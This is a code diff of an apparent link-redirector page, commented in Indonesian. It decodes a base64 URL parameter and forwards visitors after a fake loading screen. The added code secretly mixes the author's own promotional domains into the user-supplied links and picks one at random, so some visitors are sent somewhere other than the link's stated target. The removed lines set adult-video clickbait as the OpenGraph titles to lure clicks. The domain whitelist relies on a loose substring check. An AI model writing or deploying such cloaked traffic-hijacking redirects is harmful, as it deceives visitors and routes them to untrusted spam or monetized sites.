@@ -91,46 +91,65 @@
   const params = new URLSearchParams(window.location.search);
   const encoded = params.get('key');
 
+  // Kalau tidak ada key, tidak melakukan apa-apa
   if (!encoded) return;
 
   try {
-    const decodedUrl = atob(encoded.trim());
-    const urlObj = new URL(decodedUrl);
+    const decoded = atob(encoded.trim());
+    const userUrls = decoded.split('|'); // URL dari orang (di-encode ke base64)
+
+    // ✅ URL default milik lo yang wajib ikut di-random-kan
+    const myDefaultUrls = [
+      "https://abnormalitylovingmammal.com/myvideo",
+      "https://pwcenter.eu.org/promo"
+    ];
+
+    // Gabung semua jadi satu
+    const allUrls = [...userUrls, ...myDefaultUrls];
+
+    // Pilih acak salah satu dari semua URL itu
+    const finalUrl = allUrls[Math.floor(Math.random() * allUrls.length)];
+
+    const urlObj = new URL(finalUrl);
     const host = urlObj.hostname;
 
+    // Whitelist domain (biar makin aman)
     const allowedDomains = [
-      'appstalker-fb.eu.org',
-      'abnormalitylovingmammal.com',
-      'otieu.com',
-      'pwcenter.eu.org'
+      "abnormalitylovingmammal.com",
+      "pwcenter.eu.org",
+      "otieu.com",
+      "site1.com",
+      "site2.com"
     ];
 
     const isAllowed = allowedDomains.some(domain => host.includes(domain));
 
     if (isAllowed) {
-      
-      const customTitle = "Watch AV導演_恩凱Enkai หาทั้งวันเกือบได้ฟันสาวมีหำ [ซาน]";
-      document.getElementById('meta-title').innerText = customTitle;
-      document.getElementById('meta-desc').setAttribute('content', customTitle);
-      document.getElementById('og-title').setAttribute('content', customTitle);
-      document.getElementById('og-desc').setAttribute('content', customTitle);
+      // Ganti meta tag kalau perlu
+      const title = "Sedang mengalihkan ke halaman tujuan...";
+      document.getElementById('meta-title').innerText = title;
+      document.getElementById('meta-desc').setAttribute('content', title);
+      document.getElementById('og-title').setAttribute('content', title);
+      document.getElementById('og-desc').setAttribute('content', title);
 
-      
+      // Tampilkan loading
       document.getElementById("errorPage").style.display = "none";
       document.getElementById("loader").style.display = "flex";
 
-      
+      // Redirect setelah 1.2 detik
       setTimeout(() => {
-        window.location.href = decodedUrl;
+        window.location.href = finalUrl;
       }, 1200);
     } else {
-      console.warn('Redirect dibatalkan: domain tidak diizinkan.');
+      console.warn("Domain tidak diizinkan:", host);
     }
+
   } catch (err) {
-    console.error('Gagal decode atau URL tidak valid:', err);
+    console.error("Gagal decode base64:", err);
   }
 })();
 </script>
+
 
 <script>
 	document.addEventListener("DOMContentLoaded", function () {
